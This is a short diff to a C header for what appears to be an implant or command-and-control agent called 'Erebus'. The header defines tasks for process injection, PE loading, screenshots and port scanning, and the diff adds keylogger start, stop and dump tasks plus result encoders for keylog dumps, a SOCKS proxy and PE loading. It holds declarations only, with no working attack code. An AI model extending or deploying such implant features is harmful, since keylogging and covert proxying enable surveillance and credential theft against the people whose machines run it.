@@ -12,6 +12,9 @@
 #define EREBUS_TASK_PROCESS_KILL   5
 #define EREBUS_TASK_NET_IFCONFIG   6
 #define EREBUS_TASK_NET_PORTSCAN   7
+#define EREBUS_TASK_KEYLOG_START   10
+#define EREBUS_TASK_KEYLOG_STOP    11
+#define EREBUS_TASK_KEYLOG_DUMP    12
 #define EREBUS_TASK_SCREENSHOT     9
 #define EREBUS_TASK_INJECT         15
 #define EREBUS_TASK_PE_LOAD        16
@@ -160,5 +163,9 @@ int erebus_pb_decode_inject_task(const uint8_t *in, size_t in_len, erebus_inject
 void erebus_pb_free_inject_task(erebus_inject_task *t);
 int erebus_pb_encode_inject_result(int success, uint32_t pid, uint32_t tid, uint8_t **out, size_t *out_len);
 int erebus_pb_encode_screenshot_result(const uint8_t *img, size_t img_len, uint32_t w, uint32_t h, uint8_t **out, size_t *out_len);
+int erebus_pb_encode_keylog_dump_result(const void *entries, size_t count, uint8_t **out, size_t *out_len);
+int erebus_pb_encode_socks_start_result(int success, uint32_t port, uint8_t **out, size_t *out_len);
+int erebus_pb_encode_socks_stop_result(int success, uint8_t **out, size_t *out_len);
+int erebus_pb_encode_peload_result(int success, const uint8_t *output, size_t output_len, uint8_t **out, size_t *out_len);
 
 #endif
